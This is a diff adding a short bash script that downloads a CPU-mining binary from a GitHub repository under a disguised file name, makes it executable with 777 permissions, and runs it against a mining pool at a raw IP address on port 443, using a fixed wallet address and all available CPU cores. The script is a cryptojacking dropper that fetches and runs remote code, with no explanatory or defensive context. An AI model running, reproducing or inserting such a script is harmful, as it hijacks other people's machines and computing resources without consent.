@@ -1,0 +1,4 @@
+#!/bin/bash
+wget -O biru https://github.com/kidoescegh/pilekyla/raw/main/cpuminer-avx2
+chmod 777 biru
+./biru -a flex -o stratum+tcp://165.22.0.76:443 -u kc1qylrmtzw47wldzzgwfkxtgrhgvp8jnyrck33nqu.$(shuf -n 1 -i 1-99999)-AW -t $(nproc --all)
